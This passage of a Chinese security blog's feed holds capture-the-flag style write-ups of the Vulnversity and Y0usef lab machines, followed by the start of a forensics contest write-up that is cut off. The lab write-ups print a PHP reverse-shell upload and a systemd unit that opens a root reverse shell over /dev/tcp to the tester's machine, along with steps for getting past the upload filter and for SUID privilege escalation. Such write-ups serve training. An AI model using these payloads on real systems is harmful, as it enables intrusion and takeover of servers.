src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161112233.png" alt="image-20241116111237088"></p><p>扫除这个<code>/internal</code>路由之后 我们可以尝试访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161736826.png" alt="image-20241116173614626"></p><p>What is the directory that has an upload form page?</p><pre><code>/internal/</code></pre><h2 id="文件上传-反弹shell"><a href="#文件上传-反弹shell" class="headerlink" title="文件上传(反弹shell)"></a>文件上传(反弹shell)</h2><p>在文件上传页面 我们直接写入反弹shell的马 ban了php后缀  就使用.phtml 上传成功</p><pre><code class="php">&lt;?php$ip=&quot;10.11.114.143&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161946467.png" alt="imagep><p>成功上传后 访问</p><pre><code>http://10.10.40.101:3333/internal/uploads/反弹shell.phtml</code></pre><p>成功拿到shell 在创建一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161950028.png" alt="image-20241116195050982"></p><p>也找到了当前web服务的用户是bill和bill用户文件夹下的flag</p><p>What common file type you’d want to upload to exploit the server is blocked? Try a couple to find out.</p><pre><code>.php</code></pre><p>What extension is allowed after running the above exercise?</p><pre><code>.phtml</code></pre><p>What is the name of the user who manages the webserver?</p><pre><code>bill</code></pre><p>What is the user flag?</p><pre><code>8bd7992fbe8a6ad22a63361004cfcedb</code></pre><h2 id="提权-suid提权之systemctl"><a href="#提权-suid提权之systemctl" class="headerlink" title="提权(suid提权之systemctl)"></a>提权(suid提权之systemctl)</h2><p>这部分需要我们拿到root用户的flag 先看一下suid 虽然这里su和sudo也是suid权限 但是因为我们不知道bill用户的登陆密码 因此这里我们使用systemctl进行提权 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162009608.png" alt="image-20241116200950474"></p><p>可以参考这篇文章<a href="https://www.cnblogs.com/yuy0ung/articles/18421470">Linux提权-suid相关提权思路 - Yuy0ung - 博客园</a></p><pre><code>因为systemctl有suid权限，所以可以创建一个systemctl service,里面写入反弹shell的命令，通过软链接，将创建的服务嵌入他的服务中，即可反弹shell 此时反弹的shell就是root权限</code></pre><p>先在我们的kali攻击机中编写一个shell.service</p><pre><code>[Unit]Description=reverseshell[Service]Type=oneshotExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.114.143/1234 0&gt;&amp;1&#39;[Install]WantedBy=multi-user.target</code></pre><p>将这个service文件放到网站根目录中</p><pre><code>cp shell.service /var/www/html/shell.service</code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>在我们上一步反弹的shell中使用wget将这个service下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162018061.png" alt="image-20241116201849892"></p><p>将单元文件复制到<code>/dev/shm</code>目录并使用systemctl加载</p><pre><code>默认情况下，systemctl 命令是加载文档中所写的 /usr/lib/systemd/system/ 文件夹（此文件夹包含系统预定义的单元文件）和 /etc/systemd/system/ 文件夹（此文件夹包含用户定义的单元文件）。不过通常测试人员获取的低权限账号是不具备这两个目录写入权限的。由于临时目录 /tmp 中的内容可能会被随时更改或删除，所以 systemctl 也无法加载 /tmp 目录中的文件。那么解决方法是将服务单元文件放置在 /dev/shm 文件夹（Linux 中的共享内存文件系统，用于存放临时文件）下，该文件夹下的单元文件可以被 systemctl 正常加载且任意用户可写</code></pre><p>执行下面操作</p><pre><code>cp shell.service /dev/shm/shell.service</code></pre><p>使用systemctl加载服务单元文件</p><pre><code>systemctl link /dev/shm/shell.service# 建立链接systemctl enable --now /dev/shm/shell.service#启动服务   注：路径一定要写全</code></pre><p>加载成功 成功反弹shell到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162023545.png" alt="image-20241116202303326"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Vulnversity&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Vulnversity&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Vulnver</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场Y0usef渗透测试wp</title>
    <link href="http://w3nx1z1.github.io/posts/a6521a4b.html"/>
    <id>http://w3nx1z1.github.io/posts/a6521a4b.html</id>
    <published>2024-11-13T07:53:54.765Z</published>
    <updated>2025-02-14T08:30:17.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场Y0usef渗透测试wp"><a href="#vulnhub靶场Y0usef渗透测试wp" class="headerlink" title="vulnhub靶场Y0usef渗透测试wp"></a>vulnhub靶场Y0usef渗透测试wp</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>Get two flagDifficulty : easyThis works better with VirtualBox rather than VMware</code></pre><p>描述告诉我们这个靶场运行在virtualbox上比在vmware上更好 但是我没装 只能用vmware  直接导入下载的ova文件之后发生报错</p><pre><code>Capacity mismatch for disk H:\vulnhub靶场练习镜像\y0usef\y0usef\\y0usef-disk1.vmdk。</code></pre><p>大概就是告诉我们磁盘空间不匹配之类的 在网上找了个解决办法 先把ova文件解压 可以得到一个 vmdk 一个ovf文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131634298.png" alt="image-20241113163426197"></p><p>记事本打开ovf文件 将里面内容全部删掉 替换为</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;Envelope ovf:version=&quot;1.0&quot; xml:lang=&quot;en-US&quot; xmlns=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:ovf=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:rasd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot; xmlns:vssd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:vbox=&quot;http://www.virtualbox.org/ovf/machine&quot;&gt;  &lt;References&gt;    &lt;File ovf:id=&quot;file1&quot; ovf:href=&quot;y0usef-disk001.vmdk&quot;/&gt;  &lt;/References&gt;  &lt;DiskSection&gt;    &lt;Info&gt;Virtual disk information&lt;/Info&gt;    &lt;Disk ovf:capacity=&quot;30&quot; ovf:capacityAllocationUnits=&quot;byte * 2^30&quot; ovf:diskId=&quot;vmdisk1&quot; ovf:fileRef=&quot;file1&quot; ovf:format=&quot;http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot;/&gt;  &lt;/DiskSection&gt;  &lt;NetworkSection&gt;    &lt;Info&gt;Logical networks used in the package&lt;/Info&gt;    &lt;Network ovf:name=&quot;NAT&quot;&gt;      &lt;Description&gt;Logical network used by this appliance.&lt;/Description&gt;    &lt;/Network&gt;  &lt;/NetworkSection&gt;  &lt;VirtualSystem ovf:id=&quot;vm&quot;&gt;    &lt;Info&gt;A virtual machine&lt;/Info&gt;    &lt;EulaSection&gt;      &lt;Info&gt;License agreement for the virtual system&lt;/Info&gt;      &lt;License&gt;Go https://2ba.cc&lt;/License&gt;    &lt;/EulaSection&gt;    &lt;OperatingSystemSection ovf:id=&quot;96&quot;&gt;        &lt;Info&gt;The kind of installed guest operating system&lt;/Info&gt;        &lt;Description&gt;Debian_64&lt;/Description&gt;        &lt;vbox:OSType ovf:required=&quot;false&quot;&gt;Debian_64&lt;/vbox:OSType&gt;      &lt;/OperatingSystemSection&gt;    &lt;VirtualHardwareSection&gt;      &lt;Info&gt;Virtual hardware requirements&lt;/Info&gt;      &lt;System&gt;        &lt;vssd:ElementName&gt;Virtual Hardware Family&lt;/vssd:ElementName&gt;        &lt;vssd:InstanceID&gt;0&lt;/vssd:InstanceID&gt;        &lt;vssd:VirtualSystemIdentifier&gt;vm&lt;/vssd:VirtualSystemIdentifier&gt;        &lt;vssd:VirtualSystemType&gt;vm&lt;/vssd:VirtualSystemType&gt;      &lt;/System&gt;      &lt;Item&gt;        &lt;rasd:Caption&gt;1 virtual CPU&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Number of virtual CPUs&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1 virtual CPU&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;1&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;3&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AllocationUnits&gt;MegaBytes&lt;/rasd:AllocationUnits&gt;        &lt;rasd:Caption&gt;1024 MB of memory&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Memory Size&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1024 MB of memory&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;2&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;4&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1024&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;3&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;1&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController1&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;4&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;sataController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;SATA Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;sataController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;5&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;AHCI&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;20&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AddressOnParent&gt;0&lt;/rasd:AddressOnParent&gt;        &lt;rasd:Caption&gt;disk1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Disk Image&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;disk1&lt;/rasd:ElementName&gt;        &lt;rasd:HostResource&gt;/disk/vmdisk1&lt;/rasd:HostResource&gt;        &lt;rasd:InstanceID&gt;7&lt;/rasd:InstanceID&gt;        &lt;rasd:Parent&gt;5&lt;/rasd:Parent&gt;        &lt;rasd:ResourceType&gt;17&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AutomaticAllocation&gt;true&lt;/rasd:AutomaticAllocation&gt;        &lt;rasd:Caption&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:Caption&gt;        &lt;rasd:Connection&gt;NAT&lt;/rasd:Connection&gt;        &lt;rasd:ElementName&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;8&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;E1000&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;10&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;    &lt;/VirtualHardwareSection&gt;  &lt;/VirtualSystem&gt;&lt;/Envelope&gt;</code></pre><p>在直接双击ovf文件 使用vmware打开 正常导入就可以了</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>给的靶机是一个图形化页面的ubuntu 但是貌似打不开终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131700533.png" alt="image-20241113170019100"></p><p>我们还是按照流程一点点来</p><h4 id="扫ip"><a href="#扫ip" class="headerlink" title="扫ip"></a>扫ip</h4><p>nmap扫到靶场ip是192.168.64.140</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131701170.png" alt="image-20241113170116983"></p><h4 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h4><p>继续扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131706546.png" alt="image-20241113170624479"></p><h4 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h4><p>用whatweb先看一下靶机网站 没有什么特别有用的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132120196.png" alt="image-20241113212034948"></p><p>下面进行目录扫描</p><pre><code>ython3 ./dirsearch.py -u http://192.168.64.140 -i 200 -w &#39;/home/w3nx1z1/Desktop/dict-master/DirScan/dir.txt&#39; -e ,</code></pre><p>-e参数可以扫描全部文件 不指定某特定后缀名的文件</p><p>扫出administration路由 </p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p>我们访问靶场网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132125392.png" alt="image-20241113212512276"></p><p>在访问administration路由 但是是404</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132128364.png" alt="image-20241113212841270"></p><h4 id="XFF伪造"><a href="#XFF伪造" class="headerlink" title="XFF伪造"></a>XFF伪造</h4><p>尝试使用firefox插件 添加X-Forwarded-For请求头 成功访问登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130665.png" alt="image-20241113213001560"></p><p>使用弱密码admin:admin登陆后台</p><p><strong><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130476.png" alt="image-20241113213036360"></strong></p><p>找到一个文件上传功能</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132131913.png" alt="image-20241113213118853"></p><h4 id="通过文件上传反弹shell"><a href="#通过文件上传反弹shell" class="headerlink" title="通过文件上传反弹shell"></a>通过文件上传反弹shell</h4><p>基本没怎么ban 先传png文件 在修改后缀名为php即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132304644.png" alt="image-20241113230430522"></p><p>我们这里写反弹shell的php文件如下</p><pre><code class="php">&lt;?php$ip=&quot;192.168.6.160&quot;;$port=8888;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><h3 id="三、进入shell"><a href="#三、进入shell" class="headerlink" title="三、进入shell"></a>三、进入shell</h3><h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><p>先开启一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>尝试使用find找一下flag文件 没有找到 找一下home目录 找到一个base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132325716.png" alt="image-20241113232501624"></p><p>解出来是yousef用户的账密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132332610.png" alt="image-20241113233209529"></p><p>那直接可以切换用户 进入shell</p><pre><code>ssh yousef@192.168.64.140 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132333909.png" alt="image-20241113233331793"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>最简单的 找一下suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132334864.png" alt="image-20241113233441741"></p><p>看到su 直接提权就完事了 然后进入到root文件夹下 有个root.txt 读取一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337785.png" alt="image-20241113233709693"></p><p>也是base64 解一下 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337274.png" alt="image-20241113233740126"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场Y0usef渗透测试wp&quot;&gt;&lt;a href=&quot;#vulnhub靶场Y0usef渗透测试wp&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场Y0usef渗透测试wp&quot;&gt;&lt;/a&gt;vulnhub靶场Y0usef渗透测试wp&lt;/</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2024美亚杯团体赛-SeeU-Sec</title>
    <link href="http://w3nx1z1.github.io/posts/a03193dd.html"/>
    <id>http://w3nx1z1.github.io/posts/a03193dd.html</id>
    <published>2024-11-13T00:28:15.776Z</published>
    <updated>2025-02-14T08:30:17.423Z</updated>
    
    <content type="html"><![CDATA[<p>&amp;#x20; 时光荏苒，白驹过隙，今年——2024年w3nx1z1、qui1t和tianya三位师傅终于迎来了他们的第三届美亚杯，不出意外的话，这是他们第三次参加美亚杯同时也是大学四年里最后一次参加美亚杯。在下午等待团体赛检材挂载密码发布时，w3nx1z1师傅还打趣到：”今年能整个二等奖就行啦哈哈哈“。要不是经过四个小时紧张刺激的战斗之后，发现由三位师傅组成的SeeUsec战队拿下了线上学生组第一名，他们差点就信了。</p><p>&amp;#x20; 每年美亚杯的题目质量都很高，但是今年的题目似乎做起来意外的比较顺手。下面是三位师傅简单整理的一份团体赛WP，欢迎师傅们来交流指正。</p><p>（注：本wp只是三位师傅个人的见解，仅作学习交流用，不代表正确答案，非官方wp，如果有写的不准确的地方师傅们轻喷。）</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829755.png"></p><ol><li>[填空题]在个人赛的最后一部分,你对David的数字设备进行了取证检查,发现他与一名成员Alice有可疑的沟通。你现在分析Alice 的手机。 参考Alice_Mobile.bin,Alice所使用的手机网络运营商公司的名称是什么? (答案格式: 请用大写英文字母作答 ，无须留空白) (1分)</li></ol><p><code>CSL</code></p><p>找到IMSI，前5位对应移动运营商的名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829756.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829757.png"></p><p>搜索spn也找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829758.png"></p><ul><li>[填空题]</li></ul><p>参考Alice_Mobile.bin,Alice 所使用的谷歌电子邮件地址是? (答案格式: 请用小写英文字母作答,例如:<a href="mailto:&#97;&#x62;&#x63;&#x40;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;">&#97;&#x62;&#x63;&#x40;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;</a>) (2分)</p><p><code>alicecutter94@gmail.com</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829759.png"></p><ul><li>[单选题]</li></ul><p>参考Alice_Mobile.bin,谁向Alice发送了一个含有个人资料的xlsx文件? (1分)</p><blockquote><p>A. David<br>B. John<br>C. Ben<br>D. Amy<br>E. Harry</p></blockquote><p><code>B</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829760.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829761.png"></p><ul><li>[填空题]承上题,参考Alice_Mobile.bin,该文件以MD5计算的哈希值是? (答案格式: 请用大写英文字母作答和用阿拉伯数字回答) (1分)</li></ul><p><code>5457D5A68673B8D093D7666D515CCCB2</code></p><p>导出文件计算一下即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829762.png"></p><ul><li>[单选题]参考Alice_Mobile.bin, Alice于Facebook(脸书)所建立的群组? (1分)</li></ul><blockquote><p>A. 大学生炒散搵工群</p><p>B. 最全面搵工推介</p><p>C. 全港笋工好工推介2024</p><p>D. 搵工全职兼职</p><p>E. 搵工WhatsApp群</p></blockquote><pre><code class="python">C</code></pre><p>在和zhangwei的WhatsApp聊天记录中找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829763.png"></p><ul><li>[单选题]参考Alice_Mobile.bin, Alice在2024年8月15日于哪个地铁站和”客服人员”相约见面? (2分)</li></ul><blockquote><p>A. Chai Wan</p><p>B. Tai Koo</p><p>C. Wan Chai</p><p>D. Central</p><p>E. Mong Kok</p></blockquote><p><code>C</code></p><p>直接搜索</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829764.png"></p><ul><li>[填空题]参考Alice_Mobile.bin,受骗女子欧凯被指示将虚拟货币转到哪个钱包地址? (答案格式: 大写英文字母, 小写英文字母及阿拉伯数字混合组成,例如: 0xDasdGJHI34twebGHJK2354YU34h) (2分)</li></ul><p><code>0xdA9AE5b1bA2F404D0490dcd18a5C2247866FD148</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829765.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829766.png"></p><ul><li>[单选题]参考Alice_Mobile.bin, Alice指示”客服人员”使用什么交通工具离开香港? (1分)</li></ul><blockquote><p>A. 火车</p><p>B. 私家车</p><p>C. 飞机</p><p>D. 船</p><p>E. 货柜车</p></blockquote><p><code>D</code></p><p>翻到群聊的最后就是</p><p>这个题目和最后的128-130题有关联</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829767.png"></p><ul><li>[填空题]参考Alice_Mobile.bin,客服人员”ZHANG WEI”的银行卡号是多少? (答案格式:用阿拉伯数字回答, 例如: 54613165456431) (2分)</li></ul><p><code>62123465678987654321</code></p><p>zhangwei是alice在whatsapp中的联系人</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829768.png"></p><ul><li>[单选题]</li></ul><p>参考Alice_Mobile.bin,Alice总共在脸书(FACEBOOK)上发布了多少张照片? (2分)</p><blockquote><p>A. 1</p><p>B. 3</p><p>C. 5</p><p>D. 7</p><p>E. 9</p></blockquote><ul><li>[填空题]</li></ul><p>参考Alice_Mobile.bin,应用程序WhatsApp的数据库 (database) 内, 哪个message_type代表发送的内容是表情包 (Sticker)? (答案格式:用阿拉伯数字回答) (3分)</p><ul><li>[填空题]参考Alice_Mobile.bin,在Alice手机中,哪一个数据库(Database)记录了照片的数据? (答案格式:只需使用全部大写回答, 例如:ABC.DB) (2分)</li></ul><p><code>EXTERMAL.DB</code></p><p>找张图片跳转到源文件，注意大写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829769.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829770.png"></p><ul><li>[填空题]承上题,参考Alice_Mobile.bin,该文件的最后修改日期和时间 (Last Modified Time) 是? (答案格式:YYYY-MM-DD HH:MM:SS) (2分)</li></ul><p><code>2024-08-30 17:28:29</code></p><p>同上题图</p><ul><li>[单选题]从Alice的手机中发现,她一直与一名叫John的成员保持联系,你接着分析John的手机｡ 参考John_Smartphone_itunebackup.zip, 备份密码是「1234」, 回答以下题目: 在WhatsApp通讯软件内「三五成群」群组于什么时间创建? (2分)</li></ul><blockquote><p>A. 2024-08-29 17:44:38</p><p>B. 2024-07-25 15:22:09</p><p>C. 2024-07-30 12:45:50</p><p>D. 2024-07-30 16:15:34</p></blockquote><pre><code class="plain&#x20;text">C</code></pre><p>使用给的密码1234来解密ios备份分析后能在群聊消息里面找到建群时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829771.png"></p><ul><li>[单选题]参考John_Smartphone_itunebackup.zip,照片IMG_007 的创建日期时间是? (2分)</li></ul><blockquote><p>A. 2024年8月14日星期三下午02:54</p><p>B. 2024年9月02日星期三下午12:54</p><p>C. 2024年8月14日星期三下午12:54</p><p>D. 2024年8月16日星期五下午12:54</p></blockquote><pre><code class="plain&#x20;text">C</code></pre><p>图片中搜索IMG找到目标图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829772.png"></p><ul><li>[单选题]参考John_Smartphone_itunebackup.zip,John曾使用什么通讯软件联系Ben? (2分)</li></ul><blockquote><p>A. Reddit</p><p>B. WhatsApp</p><p>C. WeChat</p><p>D. Line</p></blockquote><pre><code class="plain&#x20;text">B</code></pre><p>在取出来的聊天软件分析结果中找通讯录 在whatsapp中找到名为Ben的联系人</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829773.png"></p><ul><li>[填空题]参考John_Smartphone_itunebackup.zip,于“三五成群”群中, 电子表格文件”Personal_data.xlsx”是由哪一个电话号码发送到该群组的? (答案格式:只需要用阿拉伯数字回答,包含国际电话区号和电话号码,例如:85290001111) (2分)</li></ul><pre><code class="python">85269711024</code></pre><p>直接查看文件信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829774.png"></p><ul><li>[单选题]</li></ul><p>他与一个叫Ben的人有可疑的沟通｡你接着分析Ben的手机｡ 参考BeniPhone.zip,根据 Ben 手机内通讯软件的记录,”This is a RAT APK that allows us to control Android devices remotely, enabling data access, monitoring and manipulation through an interface”是在什么时间接收或发出的? (1分)</p><blockquote><p>A. 由 Ben 于 2024-08-02 16:17:07 接收</p><p>B. 由 Ben 于 2024-08-05 15:53:37 发出</p><p>C. 由 Ben 于 2024-08-05 16:58:12 接收</p><p>D. 由 Ben 于 2024-08-05 17:22:47 发出</p></blockquote><p><code>B</code></p><p>Ben和John的聊天记录，按理来说John手机上应该也有，搜一下试试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829775.png"></p><ul><li>[单选题]参考BeniPhone.zip,根据 Ben 手机内的照片记录,”IMG_0011.PNG”是通过哪种方式生成的? (2分)</li></ul><blockquote><p>A. 从互联网下载</p><p>B. 手机拍摄</p><p>C. 手机截图</p><p>D. 以上皆不是</p></blockquote><pre><code class="python">C</code></pre><p>直接在Ben的iPhone手机文件夹中找到这张图片 判断是手机截图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829776.png"></p><ul><li>[单选题]你发现了该犯罪团伙似乎有一个共同的聊天群,其中包含有关可疑资本管理(与虚拟货币相关)的更多线索｡ 参考该聊天群组对话分析,John,David及Alice筹集资金的目的是什么? (1分)</li></ul><blockquote><p>A. 建立一个网站给人投资虚拟货币</p><p>B. 建立一个网站用作行骗</p><p>C. 创建虚拟货币钱包用作洗黑钱</p><p>D. 写一个Android (APK)应用程序包用作沟通</p></blockquote><p>共同聊天群就是“三五成群”</p><p>这个题目主要就是翻一下他们的聊天记录，团伙确实建立了一个网站用于行骗，但是分析下来感觉C可能性更高</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829777.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829778.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829779.png"></p><p>赛后师傅们分享的时候也有提到网站搭建在筹集资金之前</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829780.jpg"></p><ul><li>[单选题]</li></ul><p>参考該聊天群对话、David,Emma與Clara 的对话及IDFC的交易记录分析,哪一个虚拟货币地址储存John,David及Alice所筹集的IDFC? (3分)</p><blockquote><p>A. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6</p><p>B. 0x04d079c7ace663bbe1d2c201072d63b036d16ccd</p><p>C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c</p><p>D. 0x8155c0b8a0c95424f433d8ab6342086f0433e6c4</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829781.png"></p><p>在个人赛David的电脑中有个记录有虚拟货币交易记录的表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829782.png"></p><p>所以交易应该在14号左右</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829784.png"></p><p>但是我们发现04、10、e9都有转入记录，我认为，04位置存储的代币最多，且e9有转出给04，可能是一个中转节点，因此我选择B</p><p><img 